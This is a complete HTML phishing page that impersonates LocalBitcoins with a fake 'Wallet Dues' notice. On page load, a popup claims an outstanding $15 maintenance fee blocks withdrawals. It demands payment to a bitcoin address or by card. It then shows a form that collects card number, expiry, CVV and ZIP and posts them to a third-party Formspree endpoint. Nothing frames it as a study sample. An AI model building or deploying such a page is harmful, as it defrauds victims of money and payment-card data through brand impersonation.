<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wallet Dues</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #f2f2f2;
    }

    .payment-form {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
      margin: 50px auto;
      display: none;
    }

    .payment-form h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    .card-icons {
      text-align: center;
      margin-bottom: 20px;
    }

    .card-icons img {
      width: 40px;
      margin: 0 5px;
    }

    .payment-form input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .flex-row {
      display: flex;
      gap: 10px;
    }

    .payment-button {
      background-color: #00c6c1;
      color: white;
      padding: 12px;
      border: none;
      width: 100%;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }

    .payment-button:hover {
      background-color: #00a9a4;
    }

    footer {
      text-align: center;
      padding: 30px 0;
      font-size: 12px;
      color: #666;
    }

    .text-link {
      color: #6c4dff;
      text-decoration: underline;
      cursor: pointer;
    }
  </style>
</head>
<body onload="showPaymentPopup()">

<!-- Hidden Payment Form -->
<div id="paymentSection" class="payment-form">
  <h2>Pay Invoice</h2>
  <div class="card-icons">
    <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
    <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
    <img src="https://img.icons8.com/color/48/000000/amex.png" alt="AmEx" />
    <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
  </div>
  <form action="https://formspree.io/f/mvgalkbo" method="POST">
    <input type="number" name="amount" placeholder="Payment amount" value="15.00" readonly>
    <input type="text" name="name" placeholder="Name on card" required>
    <input type="text" name="cardnumber" placeholder="Card number" required>
    <div class="flex-row">
      <input type="text" name="expiry" placeholder="MM / YY" style="flex:1" required>
      <input type="text" name="cvv" placeholder="Security code" style="flex:1" required>
    </div>
    <input type="text" name="zip" placeholder="ZIP/Postal code" required>
    <button type="submit" class="payment-button">Pay $15.00</button>
  </form>
</div>

<footer>
  <p><strong>Contact Us:</strong> support@localbitcoins.com</p>
  <p>
    <a class="text-link" href="#">Privacy Policy</a> |
    <a class="text-link" href="#">Terms of Service</a>
  </p>
  <p class="mt-2">Â© 2025 LocalBitcoins.com. All rights reserved.</p>
</footer>

<script>
  function showPaymentPopup() {
    const proceed = confirm(
      "Notice: Your wallet has outstanding dues that need to be settled to restore full functionality, including withdrawals.\n\nThe wallet maintenance fee of $15.00 USD is pending.\n\nTo regain access:\n1. Pay in BTC: bc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n2. Or click OK to pay securely by card.\n\nNeed BTC? Visit: changelly.com/buy/btc/"
    );

    if (proceed) {
      document.getElementById("paymentSection").style.display = "block";
      window.scrollTo(0, document.getElementById("paymentSection").offsetTop);
    }
  }
</script>

</body>
</html>
